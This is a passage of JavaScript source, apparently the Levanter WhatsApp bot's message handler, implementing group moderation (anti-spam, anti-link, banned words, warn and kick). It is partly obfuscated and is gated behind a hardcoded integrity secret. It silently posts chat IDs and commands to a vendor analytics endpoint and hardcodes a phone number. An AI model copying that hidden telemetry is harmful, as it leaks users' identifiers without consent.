const fsExtra = require("fs-extra");
const { join } = require("path");
const { default: axios } = require("axios");
const { loadBaileys } = require("./baileys");
let jidNormalizedUser;
let getContentType;
let normalizeMessageContent;
let isJidGroup;
let delay;
let downloadMediaMessage;
let getAggregateVotesInPollMessage;
let getKeyAuthor;
let decryptPollVote;
const config = require("../config");
const events = require("./events");
const index = require("./index");
const { Message } = require("./class/index");
const moderationCounts = {};
const { getPmMessage, setPmMessage } = require("./db");
const { setMsgs } = require("./db/store");
const libConfig = require("./config");
const { secondsToHms, getFloor, isUrl, expiration, isFeatureEnabled } = require("./utils");
const mediaKindFromMime = (mime) => (/type\/(gif|mp4|sticker|image|audio)/.exec(mime) || [])[1];
if (!fsExtra.existsSync(join(__dirname, "../media/mention/"))) {
  fsExtra.mkdirSync(join(__dirname, "../media/mention/"));
}
const mentionStateInit = {
  done: false,
  path: "",
  message: "",
  type: "",
};
const MENTION_STATUS_ICONS = ["⏳", "✅", "❌", ""];
const KICK_WARN_DLT_RE = new RegExp("^(kick|warn|dlt)");
const extractUrls = (text) =>
  text.match(/(http|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/g);
const OWNER_NUMBER = "918136962641";
const WRITEABLE = true;
const mentionState = mentionStateInit;
const IGNORED_GROUPS = [
  "918136962641-1630730584@g.us",
  "918136962641-1635266273@g.us",
  "918136962641-1609228303@g.us",
];
const lid = (text) => {
  if (text) {
    return text.replace(/:\d+/, "");
  }
};
const AFK_RE = new RegExp("afkrey");
async function processSecurityChecks(a8) {
  const helpers = {
    NBqhv: "processSecurityChecks failed",
    AeInz: function (ab, ac) {
      return ab !== ac;
    },
    bAIHQ: "SdfCn",
    ZRjJF: function (ab, ac) {
      return ab in ac;
    },
    cuZQb: "jpegThumbnail",
    KgEKB: function (ab, ac) {
      return ab === ac;
    },
    BCTaL: "bKvUW",
  };
  const helper = helpers;
  if (!a8.linkPreview) {
    return a8;
  }
  if (a8.linkPreview.thumbnail) {
    {
      const { buffer: ac } = await index.getBuffer(a8.linkPreview.thumbnail, true);
      if (ac) {
        a8.linkPreview.thumbnail = ac;
      }
    }
  }
  if (helper.cuZQb in a8.linkPreview) {
    {
      const { buffer: ad } = await index.getBuffer(a8.linkPreview.jpegThumbnail, true);
      if (ad) {
        a8.linkPreview.jpegThumbnail = await constant.genThumbnail(ad);
      }
    }
  }
}
const toLid = (value) => value + "@lid";
const guessPlatformFromId = (text) =>
  text && typeof text == "string"
    ? text.length > 30
      ? "android"
      : text.length != 20 || text.startsWith("RGNK")
        ? text.substring(0, 3) === "3EB"
          ? "web"
          : text.length == 18
            ? "win"
            : "bot"
        : "ios"
    : text;
const pendingGroupInvites = {};
const MEDIA_KIND = {
  gif: "video",
  mp4: "video",
  sticker: "sticker",
  image: "image",
  audio: "audio",
};
const MEDIA_MIME = {
  gif: "video/mp4",
  mp4: "video/mp4",
  sticker: "image/webp",
  audio: "audio/ogg; codecs=opus",
  image: "image/png",
};
const MEDIA_EXTENSION = {
  gif: ".mp4",
  mp4: ".mp4",
  sticker: ".webp",
  audio: ".opus",
  image: ".jpeg",
};
const PLUGIN_ERROR_ENDPOINT = "https://levanter-plugin.levanter.site";
const { version } = require("../package.json");
const buildErrorPayload = (value, a9, aa) => {
  const ab = {
    a: value + "-" + version,
    b: a9,
    c: aa,
  };
  axios.post(PLUGIN_ERROR_ENDPOINT + "/xerror", ab).catch(() => {});
};
const reportCommandUsage = (a8, a9, aa) => {
  const ab = {
    jid: a8,
    command: a9,
    isGroup: aa,
  };
  axios.post(PLUGIN_ERROR_ENDPOINT + "/analytics", ab).catch(() => {});
};
const firstNonEmpty = (conversation, a9) => {
  const helpers = {
    WRqsW: "extendedTextMessage",
    bWHNx: "imageMessage",
    gCDKH: "videoMessage",
    cGQSR: "documentMessage",
    GKxJb: "listResponseMessage",
    MEUtv: "buttonsResponseMessage",
    aZfjj: "templateButtonReplyMessage",
    iTpbZ: "eventMessage",
  };
  let ac = "";
  switch (a9) {
    case helpers.WRqsW:
      ac = conversation.extendedTextMessage.text;
      break;
    case helpers.bWHNx:
      ac = conversation.imageMessage.caption;
      break;
    case helpers.gCDKH:
      ac = conversation.videoMessage.caption;
      break;
    case helpers.cGQSR:
      ac = conversation.documentMessage.caption;
      break;
    case helpers.GKxJb:
      ac = conversation.listResponseMessage.singleSelectReply.selectedRowId;
      break;
    case helpers.MEUtv:
      ac = conversation.buttonsResponseMessage.selectedButtonId;
      break;
    case helpers.aZfjj:
      ac = conversation.templateButtonReplyMessage.selectedId;
      break;
    case helpers.iTpbZ:
      ac = conversation.eventMessage.action;
      break;
    default:
      ac = conversation.conversation;
  }
  return ac;
};
const parseAntiDeleteSetting = (text) => {
  const helpers = {
    AsOzF: function (af, ag) {
      return af === ag;
    },
    sxhyo: "null",
    JQgGm: "false",
    pVnYj: function (af, ag) {
      return af > ag;
    },
  };
  const helper = helpers;
  const payload = {
    enabled: false,
  };
  if (!text || helper.sxhyo === text || helper.JQgGm === text) {
    return payload;
  }
  const split = text.trim().split(/\s+/);
  return {
    enabled: true,
    destination: split[0],
    scope: split.length > 1 ? split[1].toLowerCase() : null,
  };
};
const matchesScope = (scopeSetting, jid) => {
  const ab = {
    yYoeI: "@g.us",
    qqgCm: "no-gm",
    eKcvc: "no-pm",
  };
  if (!scopeSetting) {
    return true;
  }
  const endsWith = jid.endsWith(ab.yYoeI);
  switch (scopeSetting) {
    case "pm":
    case ab.qqgCm:
      return !endsWith;
    case "gm":
    case ab.eKcvc:
      return endsWith;
    default:
      return true;
  }
};
const resolveDestination = (setting, groupJid, privateJid) =>
  setting === "g" ? groupJid : setting === "p" || setting === "on" ? privateJid : setting;
const shouldSendReadReceipt = (text, text2) => {
  const helpers = {
    WbWaZ: function (ah, ai) {
      return ah === ai;
    },
    wvRkM: "false",
    jkguK: "null",
    rCzuI: "true",
    FIjPL: "@g.us",
  };
  const helper = helpers;
  if (!text || helper.wvRkM === text || helper.jkguK === text) {
    return false;
  }
  if (helper.rCzuI === text) {
    return true;
  }
  const [ac, ad] = text.split(/\bignore\b/);
  if (ad && index.parsedJid(ad).includes(text2)) {
    return false;
  }
  const filter = ac
    .trim()
    .split(/[\s,]+/)
    .filter(Boolean);
  if (!filter.length) {
    return true;
  }
  const endsWith = text2.endsWith(helper.FIjPL);
  return filter.some((ah) => (ah === "p" ? !endsWith : ah === "g" ? endsWith : ah === text2));
};
const ICHECKER_SECRET = "aWxvdmV5b3Vzb29vb29vbWF0Y2hidXRpZG9udGtub3d3aHlpbGlrZWxvdmV3YW50dQ==";
const test = require("./test/test");
const sendMessage = require("./sendMessage");
const { LRUCache } = require("./db/nr");
const adminCache = new LRUCache(1000, 3600000);
const greetedMembers = new LRUCache(1000, 3600000);
const checkSudoWithCache = (key, participants, text) => {
  if (!key) {
    return;
  }
  const get = adminCache.get(key);
  if (undefined !== get) {
    return get;
  }
  const find = participants.participants.find((lid) => lid.lid === key);
  if (!find) {
    return;
  }
  const includes = text.includes(index.jidToNum(find.phoneNumber));
  adminCache.set(key, includes);
  return includes;
};
const prepareVars = (session) => {
  const map = index.parseNum(libConfig[session].env.WHITE_LIST).map(index.numToJid);
  let map2 = index.parseNum(libConfig[session].env.SUDO).map(index.numToJid).map(index.jidToNum);
  let map3 = index.parseNum(libConfig[session].env.GROUP_ADMINS).map(index.numToJid);
  libConfig[session].adminsjid = map3;
  libConfig[session].sca = map3.length > 0;
  libConfig[session].TEMP_SUDO = map2.slice(0, 20);
  const map4 = libConfig[session].env.ANTIWORDS.split(",")
    .filter(Boolean)
    .map((ag = "") => new RegExp(ag.trim(), "ui"));
  libConfig[session].regexes = map4;
  libConfig[session].DISABLE_BOT_JIDS = index.parsedJid(libConfig[session].env.DISABLE_BOT);
  libConfig[session].WHITE_LIST_MAP = map;
  if (libConfig[session].env.MENTION) {
    try {
      libConfig[session].parsedMention = JSON.parse(libConfig[session].env.MENTION);
    } catch (error) {
      {
        libConfig[session].parsedMention = null;
      }
    }
  } else {
    libConfig[session].parsedMention = null;
  }
};
libConfig.preparevars = prepareVars;
let antilink = require("./antilink");
let misc = require("./misc");
const crypto = require("crypto");
const constant = require("./constant");
const refreshGlobalSockId = () => {
  const a9 = {
    GHGSk: "hex",
  };
  global.sock = crypto.randomBytes(3).toString(a9.GHGSk);
};
const icheckerValue = test.iChecker();
const isIcheckerTrusted = icheckerValue == ICHECKER_SECRET;
const shiftDescriptor = {
  value: false,
  writable: WRITEABLE,
};
constant.writeStream(global, "shift", shiftDescriptor);
const tictactoe = require("./tictactoe");
const path = require("path");
let rotationIndex = 0;
const pickRotating = (a7) => {
  let a8 = a7[rotationIndex];
  if (!a8) {
    rotationIndex = 0;
    a8 = a7[rotationIndex];
  }
  rotationIndex++;
  return a8;
};
const buildSessionConfig = (a7, a8, a9, aa, ab) => ({
  ...a7,
  commands: a8,
  PREFIX: a9,
  ...aa,
  pluginsCount: ab,
});
const ALLOWLIST_EXCLUDED_COMMANDS = ["setvar", "setsudo", "zushi"];
const cacheMentionMedia = async (a7, text, a9, aa) => {
  const helpers = {
    CsjNh: function (callback, ag, ah) {
      return callback(ag, ah);
    },
    cymKq: "audio",
    iYEwA: "opus",
    jNeYD: "sticker",
    iadHA: ".webp",
    ZvhZe: "image",
  };
  const buffer = await index.getBuffer(a7, false);
  let buffer2 = buffer.buffer;
  if (!buffer2) {
    return buffer.error;
  }
  try {
    const filePath = join(constant.TEMP_DIR, buffer.name);
    fsExtra.writeFileSync(filePath, buffer2);
    const CsjNh = helpers.CsjNh(filePath, __dirname, "../media/mention/" + aa + text);
    if (helpers.cymKq === a9) {
      {
        const ffmpegBuffer = await index.getFfmpegBuffer(filePath, "" + aa + text, helpers.iYEwA);
        fsExtra.writeFileSync(CsjNh, ffmpegBuffer);
      }
    } else if (helpers.jNeYD === a9) {
      {
        const sticker = await index.sticker(
          "" + aa + text.replace(helpers.iadHA, ""),
          filePath,
          helpers.ZvhZe === buffer.type ? 1 : 2,
          aa,
        );
        fsExtra.writeFileSync(
          CsjNh.endsWith(helpers.iadHA) ? CsjNh : CsjNh + helpers.iadHA,
          sticker,
        );
      }
    } else {
      fsExtra.writeFileSync(CsjNh, buffer2);
      if (fsExtra.existsSync(filePath)) {
        fsExtra.unlinkSync(filePath);
      }
    }
  } catch (error) {
    {
      return error;
    }
  }
};
async function executeWarnAction(participant, groupJid, sessionId, client, sock, groupMetadata) {
  const helpers = {
    LAJss: "[TEST] Security check caught error:",
    QjzHb: "Security check error",
    Mznfk: "participant_remove",
    wQIBn: function (ar, as) {
      return ar !== as;
    },
    iURra: "false",
    KLYiX: "prepare_message",
    gqmHR: "&mention",
    AGlRu: "[TEST] executeWarnAction called:",
    wZqat: function (ar, as) {
      return ar === as;
    },
    IyfDf: "GXVCz",
    efRQO: function (ar, as) {
      return ar > as;
    },
    jvnwH: "LRyNl",
    GiytM: function (ar, as) {
      return ar - as;
    },
    CgSSY: "{mention}",
    gPVhm: "&remaining",
    OBJUW: "{remaining}",
    rQfLF: "&warn",
    OwcyO: "{warn}",
    CQOLP: "{0}",
    cOqyN: "{1}",
    DURxl: "{2}",
    NUTPE: "vqmDZ",
    QDUvO: "DscpF",
    QyGzk: "executeWarnAction failed",
  };
  const helper = helpers;
  const logContext = {
    participant,
    groupJid,
    sessionId,
  };
  console.log(helper.AGlRu, logContext);
  try {
    {
      const ar = libConfig[sessionId];
      const as = ar.env.WARN_LIMIT || 3;
      const at = await index.setWarn(participant, groupJid, sessionId, as);
      if (at > as) {
        {
          if (!(await index.isAdmin(groupMetadata.participants, sock.user.jid))) {
            client.queue.push({
              type: helper.KLYiX,
              chat: groupJid,
              message: {
                text: index.lang.plugins.common.not_admin,
              },
            });
            return;
          }
          if (await index.isAdmin(groupMetadata.participants, participant)) {
            client.queue.push({
              type: helper.KLYiX,
              chat: groupJid,
              message: {
                text: index.lang.plugins.warn.cannot_remove_admin,
              },
            });
            return;
          }
          const mention = "@" + index.jidToNum(participant);
          const kickText =
            ar.env.WARN_KICK_MESSAGE?.replace(helper.gqmHR, mention) ||
            index.lang.plugins.warn.kick_default.format(mention);
          const messageBody = {
            text: kickText,
          };
          const mentionOptions = {
            mentionedJid: [participant],
          };
          const contextOptions = {
            contextInfo: mentionOptions,
          };
          const payload = {
            type: helper.KLYiX,
            chat: groupJid,
            message: messageBody,
            options: contextOptions,
          };
          client.queue.push(payload);
          await index.deleteWarn(participant, groupJid, sessionId);
          client.queue.push({
            type: helper.Mznfk,
            chat: groupJid,
            participant,
          });
        }
      } else {
        const mention = "@" + index.jidToNum(participant);
        const remaining = as - at;
        const text = (ar.env.WARN_MESSAGE || index.lang.plugins.warn.warn_default)
          .replace(helper.gqmHR, mention)
          .replace(helper.CgSSY, mention)
          .replace(helper.gPVhm, remaining)
          .replace(helper.OBJUW, remaining)
          .replace(helper.rQfLF, as)
          .replace(helper.OwcyO, as)
          .replace(helper.CQOLP, mention)
          .replace(helper.cOqyN, remaining)
          .replace(helper.DURxl, as);
        const messageBody = {
          text,
        };
        const mentionOptions = {
          mentionedJid: [participant],
        };
        const contextOptions = {
          contextInfo: mentionOptions,
        };
        const payload = {
          type: helper.KLYiX,
          chat: groupJid,
          message: messageBody,
          options: contextOptions,
        };
        client.queue.push(payload);
      }
    }
  } catch (error) {
    {
      index.logger.error(error, helper.QyGzk);
    }
  }
}
async function handleAntiWordViolation(result, msgCtx, key, aa, client, sock, groupMetadata) {
  const helpers = {
    TYIox: "fulfilled",
    DaGrz: "bulk_delete",
    DIPPb: "kick",
    kaJMw: "participant_remove",
    HvCXe: "warn",
    UUBkT: "handleAntiWordViolation failed",
  };
  if (helpers.TYIox !== result.status || !result.value) {
    return;
  }
  const action = result.value;
  if (action && msgCtx.botIsAdmin) {
    try {
      {
        await index.setTMessage(key.id, null, true);
        client.deleteQueue.push({
          type: helpers.DaGrz,
          chat: key.remoteJid,
          key,
          delay: 300,
          options: {},
        });
        if (helpers.DIPPb === action) {
          await client.queue.push({
            type: helpers.kaJMw,
            chat: key.remoteJid,
            participant: msgCtx.participant,
          });
        } else if (helpers.HvCXe === action) {
          await executeWarnAction(
            msgCtx.participant,
            key.remoteJid,
            msgCtx.session,
            client,
            sock,
            groupMetadata,
          );
        }
      }
    } catch (error) {
      {
        index.logger.error(error, helpers.UUBkT);
      }
    }
  }
}
async function handleAntiSpamViolation(result, msgCtx, key, client, sock, groupMetadata) {
  const helpers = {
    zdKfj: "fulfilled",
    qEnNO: "[TEST] handleAntiSpamViolation skipped:",
    SYMjD: "bulk_delete",
    QQNkI: function (value, aj) {
      return value + aj;
    },
    QQQTZ: function (callback, aj) {
      return callback(aj);
    },
    QSNdh: function (ai, aj) {
      return ai * aj;
    },
    otvgl: "kick",
    jBSmz: "participant_remove",
    uselv: function (ai, aj) {
      return ai !== aj;
    },
    AETia: "false",
    cesdm: "prepare_message",
    Dpcvr: "&mention",
    ESQvK: "warn",
    AkNJE: "[TEST] handleAntiSpamViolation ERROR:",
    CViDQ: "handleAntiSpamViolation failed",
  };
  if (helpers.zdKfj !== result.status || !result.value) {
    return;
  }
  const spamInfo = result.value;
  if (!spamInfo.isSpam || !msgCtx.botIsAdmin) {
    console.log(helpers.qEnNO, {
      isSpam: spamInfo.isSpam,
      botIsAdmin: msgCtx.botIsAdmin,
    });
    return;
  }
  const { action } = spamInfo;
  libConfig[msgCtx.session].temp.spamLocks ||= {};
  libConfig[msgCtx.session].temp.spamLocks[key.remoteJid] ||= {};
  if (!libConfig[msgCtx.session].temp.spamLocks[key.remoteJid][msgCtx.participant]) {
    {
      libConfig[msgCtx.session].temp.spamLocks[key.remoteJid][msgCtx.participant] = true;
      try {
        const filter = (
          libConfig[msgCtx.session].temp.spam?.[key.remoteJid]?.[msgCtx.participant]?.keys || []
        ).filter((participant) => participant.participant === msgCtx.participant);
        for (const item of filter) {
          await index.setTMessage(item.id, null, true);
          client.deleteQueue.push({
            type: helpers.SYMjD,
            chat: key.remoteJid,
            key: item,
            delay: helpers.QQNkI(500, helpers.QQQTZ(getFloor, helpers.QSNdh(1000, Math.random()))),
            options: {},
          });
        }
        if (helpers.otvgl === action) {
          if (!(msgCtx.participant in moderationCounts)) {
            {
              moderationCounts[msgCtx.participant] = 1;
              try {
                const payload = {
                  type: helpers.jBSmz,
                  chat: key.remoteJid,
                  participant: msgCtx.participant,
                };
                client.queue.push(payload);
                if (helpers.uselv(helpers.AETia, libConfig[msgCtx.session].env.ANTISPAM_MSG)) {
                  client.queue.push({
                    type: helpers.cesdm,
                    chat: key.remoteJid,
                    message: {
                      text: libConfig[msgCtx.session].env.ANTISPAM_MSG.replace(
                        helpers.Dpcvr,
                        "@" + index.jidToNum(msgCtx.participant),
                      ),
                    },
                    options: {
                      contextInfo: {
                        mentionedJid: [msgCtx.participant],
                      },
                    },
                  });
                }
              } catch (error) {
                index.logger.error(
                  error,
                  "[ANTISPAM] Failed to kick " + msgCtx.participant + " from " + key.remoteJid,
                );
              } finally {
                delete moderationCounts[msgCtx.participant];
              }
            }
          }
        } else if (helpers.ESQvK === action) {
          await executeWarnAction(
            msgCtx.participant,
            key.remoteJid,
            msgCtx.session,
            client,
            sock,
            groupMetadata,
          );
        }
      } catch (error) {
        {
          console.error(helpers.AkNJE, error.message, error.stack);
          index.logger.error(error, helpers.CViDQ);
        }
      } finally {
        delete libConfig[msgCtx.session].temp.spamLocks[key.remoteJid][msgCtx.participant];
      }
    }
  }
}
async function handleAntiLinkViolation(result, msgCtx, key, client, sock, groupMetadata) {
  const helpers = {
    VmYbw: "fulfilled",
    uHajb: "bulk_delete",
    EUhtI: "kick",
    QBxhm: "participant_remove",
    VFSHP: "warn",
    YtiZc: "handleAntiLinkViolation failed",
  };
  if (helpers.VmYbw !== result.status || !result.value) {
    return;
  }
  const action = result.value;
  if (action && msgCtx.botIsAdmin) {
    try {
      await index.setTMessage(key.id, null, true);
      client.deleteQueue.push({
        type: helpers.uHajb,
        chat: key.remoteJid,
        key,
        delay: 300,
        options: {},
      });
      if (helpers.EUhtI === action) {
        await client.queue.push({
          type: helpers.QBxhm,
          chat: key.remoteJid,
          participant: msgCtx.participant,
        });
      } else if (helpers.VFSHP === action) {
        await executeWarnAction(
          msgCtx.participant,
          key.remoteJid,
          msgCtx.session,
          client,
          sock,
          groupMetadata,
        );
      }
    } catch (error) {
      {
        index.logger.error(error, helpers.YtiZc);
      }
    }
  }
}
let testSpamFlag = false;
async function runSecurityChecks(
  msgCtx,
  key,
  message,
  client,
  sock,
  groupMetadata,
  hasUrls,
  isNotWhiteListed,
) {
  const helpers = {
    fppoX: "[TEST] processSecurityChecks START:",
    WnxsE: "[TEST] Anti-Spam Condition Check:",
    PtZsM: function (callback, ai, aj, ak, al, am, an, ao) {
      return callback(ai, aj, ak, al, am, an, ao);
    },
    cKXAr: function (callback, ai, aj, ak, al, am, an) {
      return callback(ai, aj, ak, al, am, an);
    },
    RfGPO: "processSecurityChecks failed",
  };
  if (process.env.LEVANTER_TEST) {
    testSpamFlag = true;
  }
  if (process.env.LEVANTER_TEST) {
    console.log(helpers.fppoX, {
      hasUrls,
      is_not_white: isNotWhiteListed,
      spamFlag: testSpamFlag,
    });
    console.log(helpers.WnxsE, {
      is_not_white: isNotWhiteListed,
      spamFlag: testSpamFlag,
      isGroup: msgCtx.isGroup,
      notBot: !msgCtx.isBot,
      notFromMe: !msgCtx.fromMe,
      notVotes: !msgCtx.votes,
      notAdmin: !msgCtx.admin,
    });
  }
  try {
    {
      const [ai, aj, ak] = await Promise.allSettled([
        msgCtx.text &&
        isNotWhiteListed &&
        msgCtx.isGroup &&
        !msgCtx.fromMe &&
        !msgCtx.votes &&
        !msgCtx.admin
          ? antilink.isWords(msgCtx.text, key.remoteJid, msgCtx.session)
          : Promise.resolve(false),
        !(isNotWhiteListed && testSpamFlag) ||
        !msgCtx.isGroup ||
        msgCtx.isBot ||
        msgCtx.fromMe ||
        msgCtx.votes ||
        msgCtx.admin
          ? Promise.resolve(false)
          : misc.isSpam(
              key.remoteJid,
              msgCtx.participant,
              key,
              message.type,
              msgCtx.text || "",
              msgCtx.mentions || [],
              hasUrls,
              msgCtx.session,
            ),
        msgCtx.text &&
        isNotWhiteListed &&
        msgCtx.isGroup &&
        !msgCtx.fromMe &&
        !msgCtx.votes &&
        !msgCtx.admin
          ? antilink.isAntiLink(msgCtx.text, key.remoteJid, msgCtx.session)
          : Promise.resolve(false),
      ]);
      const al = async () =>
        msgCtx.isGroup
          ? groupMetadata || (await libConfig[msgCtx.session].fetchGroupMetadata(key.remoteJid))
          : null;
      await Promise.all([
        helpers.PtZsM(handleAntiWordViolation, ai, msgCtx, key, message, client, sock, await al()),
        helpers.cKXAr(handleAntiSpamViolation, aj, msgCtx, key, client, sock, await al()),
        helpers.cKXAr(handleAntiLinkViolation, ak, msgCtx, key, client, sock, await al()),
      ]);
    }
  } catch (error) {
    index.logger.error(error, helpers.RfGPO);
  }
}
if (isIcheckerTrusted) {
  exports.handler = async (msg, client, getMessage) => {
    const helpers = {
      IDzJM: "null",
      fqNJp: "false",
      xEnIT: function (b8, b9) {
        return b8 > b9;
      },
      IXhdw: "Failed to send error notification",
      fFTpI: "prepare_message",
      CXTZb: function (b8, b9) {
        return b8 === b9;
      },
      vMJOC: "true",
      hMXIY: function (value, b9) {
        return value + b9;
      },
      xIfXn: "type/",
      afnzu: function (value, b9) {
        return value + b9;
      },
      oGLtV: "0@s.whatsapp.net",
      hrzBx: "status@broadcast",
      vXHGP: function (callback, b9, ba) {
        return callback(b9, ba);
      },
      buqDk: "&mention",
      ByXPI: "{0}",
      KKAzf: "[TEST] Security check caught error:",
      CkOgC: "Security check error",
      BIMRv: "@s.whatsapp.net",
      hEgHT: "EVENT_",
      UuNKd: function (callback, b9) {
        return callback(b9);
      },
      HNOVW: "eventMessage",
      ozaOA: "event",
      oGopz: function (callback, b9) {
        return callback(b9);
      },
      kxZjh: "lid",
      rGKeF: "DTFYY",
      Owmab: function (b8, b9) {
        return b8 == b9;
      },
      NpYyk: "reactionMessage",
      Csvde: "not_reply_message",
      vDEio: function (b8, b9) {
        return b8 !== b9;
      },
      LmbwO: "reaction.message",
      TXGNZ: "pollUpdateMessage",
      SpFiX: function (callback, b9) {
        return callback(b9);
      },
      HPqqG: function (callback, b9, ba, bb) {
        return callback(b9, ba, bb);
      },
      YzrXC: "groupStatusMentionMessage",
      htnmg: "kick",
      rzwlq: "participant_remove",
      yvIEV: "warn",
      GLKPg: "groupStatusMessageV2",
      yhvCu: "[Handler] Step 5: creating ctx...",
      LVEXx: function (callback, b9, ba, bb, bc, bd) {
        return callback(b9, ba, bb, bc, bd);
      },
      NRnQp: "protocolMessage",
      DrpAM: function (b8, b9) {
        return b8 !== b9;
      },
      vrUyM: function (callback, b9, ba) {
        return callback(b9, ba);
      },
      CreRu: "forward",
      IwyLz: function (callback, b9) {
        return callback(b9);
      },
      YKblH: function (callback, b9, ba) {
        return callback(b9, ba);
      },
      OlZnn: "           Message edited #{0}",
      mTMRl: function (b8, b9) {
        return b8 == b9;
      },
      aguqN: "groupInviteMessage",
      miXTe: function (value, b9) {
        return value + b9;
      },
      aEPdc: function (b8, b9) {
        return b8 * b9;
      },
      FaHnH: "_Joined_",
      EIptc: "Failed to join group via auto-join",
      qbHmW: function (b8, b9) {
        return b8 != b9;
      },
      SHVIW: function (callback, b9) {
        return callback(b9);
      },
      YeyMa: "http",
      CLMpj: "image",
      ISZaj: "video",
      AziPl: "audio",
      UlAXh: "webp",
      ddzHo: "sticker",
      ZOZIJ: "text",
      QMMGi: function (b8, b9) {
        return b8 == b9;
      },
      QlmJK: "web",
      VBpnu: function (b8, b9) {
        return b8 == b9;
      },
      wOsuk: "string",
      Kzerm: "3EB0",
      GrpPV: "BAE5",
      EJIrI: "bot",
      STTuw: function (b8, b9) {
        return b8 === b9;
      },
      rpxfH: function (b8, b9) {
        return b8 === b9;
      },
      cOvuz: function (b8, b9) {
        return b8 !== b9;
      },
      LPykf: "stickerMessage",
      XpRLI: "base64",
      YRJDA: function (value, b9) {
        return value + b9;
      },
      tGfMK: function (callback, b9, ba) {
        return callback(b9, ba);
      },
      dRdbu: "audioMessage",
      Heavd: "played",
      CueTI: "read",
      fnNoM: "join",
      toEOt: "@lid",
      qceAE: function (b8, b9) {
        return b8 == b9;
      },
      hoGGI: "ptvMessage",
      VKPCc: "viewOnceMessageV2Extension",
      osVFg: "ephemeralMessage",
      QLLlw: "viewOnceMessage",
      IVZqg: "viewOnceMessageV2",
      pVSyC: function (callback, b9) {
        return callback(b9);
      },
      gnwyw: function (b8, b9) {
        return b8 == b9;
      },
      WKUnd: "incoming.message",
      jIaEL: "conversation",
      PBpoj: "extendedTextMessage",
      iWFWD: "[TEST] TicTacToe move detected, code:",
      kRHSr: function (b8, b9) {
        return b8 == b9;
      },
      RzNkY: "#lastseen",
      fXblg: function (b8, b9) {
        return b8 - b9;
      },
      zAvPT: function (b8, b9) {
        return b8 / b9;
      },
      RRpNJ: function (callback, b9) {
        return callback(b9);
      },
      yxJqz: "mp4",
      oBATK: "gif",
      Rsium: "undefined",
      HfaAy: function (callback, b9, ba) {
        return callback(b9, ba);
      },
      EHWYw: function (b8, b9) {
        return b8 == b9;
      },
      utQfO: function (b8, b9) {
        return b8 == b9;
      },
      oAcsf: function (b8, b9) {
        return b8 == b9;
      },
      SbbUG: "[TEST] Command completed successfully",
      mYAlj: function (callback, b9, ba, bb) {
        return callback(b9, ba, bb);
      },
      aCmNt: function (b8, b9) {
        return b8 == b9;
      },
      Rdcoq: "object",
      ivbtN: function (callback, b9, ba, bb) {
        return callback(b9, ba, bb);
      },
      FFnTU: "Handler error caught",
    };
    if (!jidNormalizedUser) {
      {
        const baileys = await loadBaileys();
        jidNormalizedUser = baileys.jidNormalizedUser;
        getContentType = baileys.getContentType;
        normalizeMessageContent = baileys.normalizeMessageContent;
        isJidGroup = baileys.isJidGroup;
        delay = baileys.delay;
        downloadMediaMessage = baileys.downloadMediaMessage;
        getAggregateVotesInPollMessage = baileys.getAggregateVotesInPollMessage;
        getKeyAuthor = baileys.getKeyAuthor;
        decryptPollVote = baileys.decryptPollVote;
      }
    }
    const sock = client.session;
    const botState = client.botState;
    const isDebugRestart = helpers.vMJOC === process.env.DEBUG_RESTART;
    if (isDebugRestart) {
      index.logger.info(
        "[Handler] Entry: msg=" +
          msg.key?.id?.slice(-8) +
          ", connected=" +
          botState?.connected +
          ", sessionValid=" +
          !!sock,
      );
    }
    if (botState.id !== sock.levanterId) {
      if (isDebugRestart) {
        index.logger.warn(
          "[Handler] Session ID mismatch: " + botState.id + " !== " + sock.levanterId,
        );
      }
      return;
    }
    const bot = botState.bot;
    let flag = false;
    let flag2 = false;
    testSpamFlag ||= helpers.xEnIT(process.uptime(), 60);
    const { key, message, pushName, messageTimestamp } = msg;
    if (!message || (key && helpers.hrzBx == key.remoteJid) || !botState) {
      if (isDebugRestart && !message) {
        index.logger.warn("[Handler] No message content for " + key?.id?.slice(-8));
      }
    } else {
      try {
        let msgCtx = {
          session: botState.id,
        };
        if (
          libConfig[msgCtx.session].DISABLE_BOT_JIDS.includes(
            key.participantAlt || key.participant,
          ) ||
          botState.bbb.includes(key.participantAlt || key.participant) ||
          botState.bbb.includes(key.remoteJidAlt || key.remoteJid)
        ) {
          return;
        }
        msgCtx.message = key.id.startsWith(helpers.hEgHT)
          ? message
          : normalizeMessageContent(message);
        msgCtx.type = getContentType(msgCtx.message) || Object.keys(msgCtx.message)[0];
        if (!msgCtx.type) {
          return;
        }
        if (helpers.HNOVW === msgCtx.type) {
          msgCtx.type = helpers.ozaOA;
          msgCtx.event_action = msgCtx.message.eventMessage.action;
        }
        msgCtx.isGroup = isJidGroup(key.remoteJid);
        let groupMetadata = null;
        const cachedGroupMetadata = msgCtx.isGroup
          ? libConfig[msgCtx.session].groupMetadata[key.remoteJid]
          : null;
        if (cachedGroupMetadata && cachedGroupMetadata.participants) {
          groupMetadata = cachedGroupMetadata;
        }
        const getGroupMetadata = async () =>
          msgCtx.isGroup
            ? groupMetadata ||
              ((groupMetadata = await libConfig[msgCtx.session].fetchGroupMetadata(key.remoteJid)),
              groupMetadata)
            : null;
        const botLid = lid(sock.user.lid);
        const botJid = sock.user.jid;
        const isFromMe =
          true === key.fromMe ||
          key.participant === botLid ||
          (!msgCtx.isGroup &&
            (key.remoteJid === botJid ||
              key.remoteJid === botLid ||
              key.remoteJidAlt === botJid ||
              key.remoteJidAlt === botLid));
        let sender;
        if (msgCtx.isGroup) {
          if (key.participantAlt || key.participant) {
            {
              const dp =
                helpers.oGopz(jidNormalizedUser, key.participantAlt || key.participant) ||
                key.participantAlt ||
                key.participant;
              sender =
                (dp &&
                  dp.endsWith(helpers.kxZjh) &&
                  (await libConfig[msgCtx.session].findJid(dp))) ||
                dp;
            }
          } else {
            sender = isFromMe ? sock.user.jid : msg.participantAlt || msg.participant;
          }
          if (!sender) {
            index.logger.warn(
              "[Handler] Failed to resolve participant for group message " +
                key.id +
                " in " +
                key.remoteJid +
                ". Type: " +
                msgCtx.type +
                "  Message: " +
                JSON.stringify(msg) +
                " ",
            );
          }
        } else if (isFromMe) {
          sender = sock.user.jid;
        } else {
          const dq = key.remoteJid?.endsWith(helpers.BIMRv) ? key.remoteJid : null;
          const dr = key.remoteJidAlt?.endsWith(helpers.BIMRv) ? key.remoteJidAlt : null;
          sender = dq || dr || key.remoteJidAlt || key.remoteJid;
        }
        if (isDebugRestart) {
          index.logger.info("[Handler] Step 2: _p resolved = " + sender?.slice(0, 20) + "...");
        }
        if (msgCtx.isGroup) {
          if (sender && sender.endsWith(helpers.BIMRv)) {
